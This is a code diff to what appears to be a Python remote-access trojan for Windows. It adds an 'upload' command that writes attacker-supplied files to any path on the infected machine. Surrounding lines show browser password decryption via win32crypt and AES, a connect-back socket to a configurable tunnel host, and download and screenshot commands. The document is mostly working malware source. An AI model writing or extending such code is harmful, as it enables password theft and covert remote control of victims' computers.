@@ -9,12 +9,12 @@ import sqlite3
 import base64
 import json
 import win32crypt
+import io
 from Crypto.Cipher import AES
-import urllib.request
 
-HOST = '127.0.0.1'  # Ilagay dito ang Cloudflare Tunnel address mo
+HOST = '127.0.0.1'
 PORT = 4443
-CHECK_INTERVAL = 10  # seconds para mag-check ng internet
+CHECK_INTERVAL = 10  # seconds
 
 def decrypt_password(buff, master_key):
     try:
@@ -27,11 +27,10 @@ def decrypt_password(buff, master_key):
         return "[Decryption Failed]"
 
 def is_connected():
-    """Check if internet is available"""
     try:
-        urllib.request.urlopen("http://1.1.1.1", timeout=5)
+        socket.create_connection(("8.8.8.8", 53), timeout=3)
         return True
-    except:
+    except OSError:
         return False
 
 def connect():
@@ -90,6 +89,33 @@ def handle_server(s):
                     s.sendall(data)
                 except Exception as e:
                     s.sendall(f"[!] Download error: {e}\n__end__".encode())
+                continue
+
+            # --- Upload File ---
+            if cmd.lower().startswith("upload "):
+                try:
+                    parts = cmd.split(maxsplit=2)
+                    if len(parts) < 3:
+                        s.sendall(b"[!] Usage: upload <remote_path> <file_size>\n__end__")
+                        continue
+
+                    remote_path = parts[1].strip()
+                    expected_size = int(parts[2].strip())
+
+                    s.sendall(b"[+] Ready to receive file\n__end__")
+                    received_data = b""
+                    while len(received_data) < expected_size:
+                        chunk = s.recv(4096)
+                        if not chunk:
+                            break
+                        received_data += chunk
+
+                    with open(remote_path, "wb") as f:
+                        f.write(received_data)
+
+                    s.sendall(f"[+] File uploaded successfully to {remote_path}\n__end__".encode())
+                except Exception as e:
+                    s.sendall(f"[!] Upload error: {e}\n__end__".encode())
                 continue
 
             # --- Screenshot ---
